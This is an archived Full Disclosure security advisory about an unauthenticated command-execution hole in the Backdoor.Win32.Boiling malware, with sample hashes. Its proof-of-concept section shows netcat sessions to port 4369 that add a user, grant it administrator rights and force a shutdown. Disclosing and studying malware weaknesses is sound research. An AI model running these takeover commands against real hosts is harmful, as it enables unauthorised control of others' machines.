---
title: Backdoor.Win32.Boiling / Remote Command Execution
url: https://seclists.org/fulldisclosure/2024/Sep/54
source: Full Disclosure
date: 2024-09-30
fetch_date: 2025-10-06T18:26:06.959669
---

# Backdoor.Win32.Boiling / Remote Command Execution

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)

[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)

## [Full Disclosure](/fulldisclosure/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](53)
[By Date](date.html#54)
[![Next](/images/right-icon-16x16.png)](55)

[![Previous](/images/left-icon-16x16.png)](53)
[By Thread](index.html#54)
[![Next](/images/right-icon-16x16.png)](55)

![](/shared/images/nst-icons.svg#search)

# Backdoor.Win32.Boiling / Remote Command Execution

---

*From*: malvuln <malvuln13 () gmail com>
*Date*: Fri, 27 Sep 2024 16:19:46 -0400

---

```
Discovery / credits: Malvuln (John Page aka hyp3rlinx) (c) 2024
Original source:
https://malvuln.com/advisory/80cb490e5d3c4205434850eff6ef5f8f.txt
Contact: malvuln13 () gmail com
Media: x.com/malvuln

Threat: Backdoor.Win32.Boiling
Vulnerability: Unauthenticated Remote Command Execution
Description: The malware listens on TCP port 4369. Third party
adversaries who can reach an infected host, can issue single OS
commands to takeover the system undermining the initial infection.
Family: Boiling
Type: PE32
MD5: 80cb490e5d3c4205434850eff6ef5f8f
SHA256: cbaefa79eb48d893426d438b48ca0fc6e7f6f4a6810b9c1e76bf625b69a609e1
Vuln ID: MVID-2024-0696
Disclosure: 09/27/2024

Exploit/PoC:
nc64.exe x.x.x.x 4369
calc
OK, Success in Execute CommandÃº
nc64.exe 192.168.18.125 4369
net user hyp3rlinx 666 /add
OK, Success in Execute CommandÃº
nc64.exe 192.168.18.125 4369
net localgroup administrators hyp3rlinx /add
OK, Success in Execute CommandÃº
nc64.exe 192.168.18.125 4369
ping 8.8.8.8 > out.txt
OK, Success in Execute CommandÃº
shutdown -f
OK, Success in Execute CommandÃº

Disclaimer: The information contained within this advisory is supplied
"as-is" with no warranties or guarantees of fitness of use or
otherwise. Permission is hereby granted for the redistribution of this
advisory, provided that it is not altered except by reformatting it,
and that due credit is given. Permission is explicitly given for
insertion in vulnerability databases and similar, provided that due
credit is given to the author. The author is not responsible for any
misuse of the information contained herein and accepts no
responsibility for any damage caused by the use or misuse of this
information. The author prohibits any malicious use of security
related information or exploits by the author or elsewhere. Do not
attempt to download Malware samples. The author of this website takes
no responsibility for any kind of damages occurring from improper
Malware handling or the downloading of ANY Malware mentioned on this
website or elsewhere. All content Copyright (c) Malvuln.com (TM).
_______________________________________________
Sent through the Full Disclosure mailing list
https://nmap.org/mailman/listinfo/fulldisclosure
Web Archives & RSS: https://seclists.org/fulldisclosure/
```

---

[![Previous](/images/left-icon-16x16.png)](53)
[By Date](date.html#54)
[![Next](/images/right-icon-16x16.png)](55)

[![Previous](/images/left-icon-16x16.png)](53)
[By Thread](index.html#54)
[![Next](/images/right-icon-16x16.png)](55)

### Current thread:

* **Backdoor.Win32.Boiling / Remote Command Execution** *malvuln (Sep 28)*

![](/shared/images/nst-icons.svg#search)

## [Nmap Security Scanner](https://nmap.org/)

* [Ref Guide](https://nmap.org/book/man.html)* [Install Guide](https://nmap.org/book/install.html)* [Docs](https://nmap.org/docs.html)* [Download](https://nmap.org/download.html)* [Nmap OEM](https://nmap.org/oem/)

## [Npcap packet capture](https://npcap.com/)

* [User's Guide](https://npcap.com/guide/)* [API docs](https://npcap.com/guide/npcap-devguide.html#npcap-api)* [Download](https://npcap.com/#download)* [Npcap OEM](https://npcap.com/oem/)

## [Security Lists](https://seclists.org/)

* [Nmap Announce](https://seclists.org/nmap-announce/)* [Nmap Dev](https://seclists.org/nmap-dev/)* [Full Disclosure](https://seclists.org/fulldisclosure/)* [Open Source Security](https://seclists.org/oss-sec/)* [BreachExchange](https://seclists.org/dataloss/)

## [Security Tools](https://sectools.org)

* [Vuln scanners](https://sectools.org/tag/vuln-scanners/)* [Password audit](https://sectools.org/tag/pass-audit/)* [Web scanners](https://sectools.org/tag/web-scanners/)* [Wireless](https://sectools.org/tag/wireless/)* [Exploitation](https://sectools.org/tag/sploits/)

## [About](https://insecure.org/)

* [About/Contact](https://insecure.org/fyodor/)* [Privacy](https://insecure.org/privacy.html)* [Advertising](https://insecure.org/advertising.html)* [Nmap Public Source License](https://nmap.org/npsl/)

[![](/shared/images/nst-icons.svg#twitter)](https://twitter.com/nmap "Visit us on Twitter")
[![](/shared/images/nst-icons.svg#facebook)](https://facebook.com/nmap "Visit us on Facebook")
[![](/shared/images/nst-icons.svg#github)](https://github.com/nmap/ "Visit us on Github")
[![](/shared/images/nst-icons.svg#reddit)](https://reddit.com/r/nmap/ "Discuss Nmap on Reddit")